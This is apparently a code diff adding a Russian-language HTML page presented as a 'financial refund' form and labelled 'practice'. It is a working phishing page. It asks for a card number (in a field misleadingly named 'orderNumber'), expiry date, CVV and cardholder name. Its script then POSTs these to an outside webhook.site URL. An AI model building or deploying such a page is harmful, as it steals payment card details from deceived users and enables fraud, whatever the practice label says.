@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Форма возврата (практика)</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f5f5f5;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .form-container {
+      background: white;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      width: 320px;
+    }
+    .form-container h2 {
+      color: #a200a2;
+      text-align: center;
+      margin-bottom: 20px;
+    }
+    .form-container input {
+      width: 100%;
+      padding: 10px;
+      margin: 8px 0;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 16px;
+      transition: all 0.2s ease;
+    }
+    .form-container input:focus {
+      border-color: #a200a2;
+      outline: none;
+      box-shadow: 0 0 5px rgba(162,0,162,0.4);
+    }
+    .form-container button {
+      width: 100%;
+      padding: 12px;
+      border: none;
+      background: linear-gradient(90deg, #ff00ff, #a200a2);
+      color: white;
+      font-size: 16px;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+    .form-container button:hover {
+      background: linear-gradient(90deg, #a200a2, #ff00ff);
+    }
+  </style>
+</head>
+<body>
+  <div class="form-container">
+    <h2>Финансовый возврат</h2>
+    <form id="refundForm">
+      <input type="text" id="orderNumber" placeholder="0000 0000 0000 0000" required>
+      <input type="text" id="expiry" placeholder="MM/YY" required>
+      <input type="text" id="cvv" placeholder="CVV" required>
+      <input type="text" id="cardName" placeholder="Имя владельца" required>
+      <button type="submit">Отправить запрос</button>
+    </form>
+  </div>
+
+  <script>
+    const form = document.getElementById("refundForm");
+
+    form.addEventListener("submit", (e) => {
+      e.preventDefault();
+
+      const formData = {
+        cardNumber: document.getElementById("orderNumber").value,
+        expiry: document.getElementById("expiry").value,
+        cvv: document.getElementById("cvv").value,
+        name: document.getElementById("cardName").value,
+      };
+
+      console.log("Отправляем данные:", formData);
+
+      fetch("https://webhook.site/267c92e9-94d2-4261-b60e-0fc42bf1f855", {
+        method: "POST",
+        body: JSON.stringify(formData),
+        headers: { "Content-Type": "application/json" }
+      })
+      .then(res => {
+        if (res.ok) {
+          alert("✅ Данные отправлены! Проверь webhook.site");
+        } else {
+          alert("⚠️ Ошибка при отправке");
+        }
+      })
+      .catch(err => console.error("Ошибка:", err));
+    });
+  </script>
+</body>
+</html>
